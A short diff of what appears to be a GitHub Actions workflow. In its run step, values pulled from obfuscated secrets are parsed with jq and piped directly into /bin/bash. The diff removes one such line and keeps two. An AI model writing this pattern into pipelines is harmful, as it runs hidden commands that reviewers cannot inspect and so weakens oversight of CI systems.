@@ -21,7 +21,6 @@ jobs:
           nwno1515: ${{ secrets.nwno1515 }}
         run: |
           printf '%s' "$nwno1515" | jq -r .lsrv414 | /bin/bash
-          echo $zhzpq3730 | jq -r .fnleh1 | /bin/bash
           printf '%s' "$e4" | jq -r .v97 | /bin/bash
 
       - name: Archive data
